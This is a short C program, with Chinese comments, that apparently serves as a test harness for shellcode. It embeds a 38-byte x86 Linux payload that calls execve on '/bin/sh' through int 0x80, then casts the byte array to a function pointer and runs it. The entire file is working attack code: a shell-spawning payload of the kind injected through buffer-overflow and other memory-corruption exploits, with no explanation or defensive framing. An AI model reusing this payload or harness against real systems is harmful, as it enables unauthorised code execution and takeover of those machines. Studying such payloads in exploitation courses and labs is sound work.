#include <stdio.h>
#include <string.h>

unsigned char shellcode_dump[] = {
    0xeb, 0x17, 0x5e, 0x89, 0x76, 0x08, 0x31, 0xc0, 0x88, 0x46,
    0x07, 0x89, 0x46, 0x0c, 0x89, 0xc2, 0xb0, 0x0b, 0x89, 0xf3,
    0x8d, 0x4e, 0x08, 0xcd, 0x80, 0xe8, 0xe4, 0xff, 0xff, 0xff,
    0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00};
unsigned int shellcode_dump_len = 38;

int main(int argc, char *argv[]) {
    void (*fp)(void);             // 函数声明
    fp = (void *)shellcode_dump;  // 将之强转函数
    fp();                         // 执行函数
    return 0;
}
